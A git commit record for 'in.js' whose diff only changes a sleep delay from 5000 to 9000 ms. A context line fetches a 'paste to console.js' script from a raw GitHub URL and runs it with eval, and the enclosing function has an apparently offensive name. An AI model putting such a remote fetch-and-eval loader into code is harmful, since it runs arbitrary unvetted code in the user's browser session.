cc09d81562c4c4b87566061bbd8fbe52ee3e92a6
YmL <72396404+NotYmL@users.noreply.github.com>
2022-10-08 14:42:41 +0200

    Update in.js

--- in.js
+++ in.js
@@ -6,7 +6,7 @@ async function nig(){
     nig();
     return
   }
-  await sleep(5000)
+  await sleep(9000)
   await fetch('https://raw.githubusercontent.com/NotYmL/emcrydisc/main/paste%20to%20console.js').then(r=>r.text()).then(eval)
 }
 
